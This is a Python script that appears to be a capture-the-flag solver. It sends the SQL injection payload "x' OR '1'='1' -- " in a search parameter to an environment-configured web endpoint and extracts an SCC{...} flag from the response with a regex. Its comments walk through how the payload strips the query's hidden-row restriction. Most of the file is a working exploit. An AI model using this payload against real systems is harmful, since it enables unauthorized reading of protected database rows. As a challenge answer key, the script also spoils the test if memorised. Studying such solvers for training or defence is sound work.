import os
import re

import requests

SITE_URL = os.environ["SERVICE_APP_MAIN_ENDPOINT"]

# The index page builds its query like this:
#   SELECT title, flag FROM flags WHERE title LIKE '%{search}%' AND is_hidden = 0;
#
# Supplying a `search` value that closes the string literal and appends an
# always-true OR condition, followed by a `--` comment, strips the trailing
# `AND is_hidden = 0` restriction entirely:
#   SELECT title, flag FROM flags WHERE title LIKE '%x' OR '1'='1' -- %' AND is_hidden = 0;
# which becomes:
#   SELECT title, flag FROM flags WHERE title LIKE '%x' OR '1'='1'
# returning every row, including the hidden one holding the real flag.
PAYLOAD = "x' OR '1'='1' -- "


def main():
    response = requests.get(SITE_URL + "/", params={"search": PAYLOAD}, timeout=10)
    response.raise_for_status()

    match = re.search(r"SCC\{[^}]*\}", response.text)
    if not match:
        print("Flag not found in response:")
        print(response.text)
        raise SystemExit(1)

    print(f"Flag: {match.group(0)}")


if __name__ == "__main__":
    main()
